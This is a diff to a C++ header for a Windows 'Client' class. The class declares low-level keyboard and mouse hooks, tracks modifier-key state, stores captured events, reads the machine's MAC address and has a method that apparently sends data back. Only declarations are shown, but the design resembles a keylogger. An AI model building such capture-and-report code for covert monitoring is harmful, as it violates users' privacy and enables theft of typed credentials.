@@ -4,6 +4,8 @@
 #include <list>
 #include <iostream>
 #include "Event.h"
+#include "KeyboardEvent.h"
+#include "MouseEvent.h"
 #pragma comment(lib, "IPHLPAPI.lib")
 
 class Client
@@ -18,10 +20,26 @@ public:
 	void					unsetMouseHook(void);
 	void					sendBackMessage(void);
 	void					getMACAddress(void);
+	void					setShift(bool shift);
+	void					setCtrl(bool ctrl);
+	void					setAlt(bool alt);
+	void					setCapsLock(bool capsLock);
+	bool					getShift(void);
+	bool					getCtrl(void); 
+	bool					getAlt(void);
+	bool					getCapsLock(void);
+	void					addEvent(Event &e);
 private:
+	bool					isValidMac(PIP_ADAPTER_INFO adapterInfo);
+	std::string				addrToString(unsigned char mac[]);
 	HHOOK					m_keyboardHook;
 	HHOOK					m_mouseHook;
 	std::list<Event>		m_events;
+	bool					m_Shift;
+	bool					m_Ctrl;
+	bool					m_Alt;
+	bool					m_CapsLock;
+	std::string				m_MAC;
 };
 
 LRESULT CALLBACK			KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
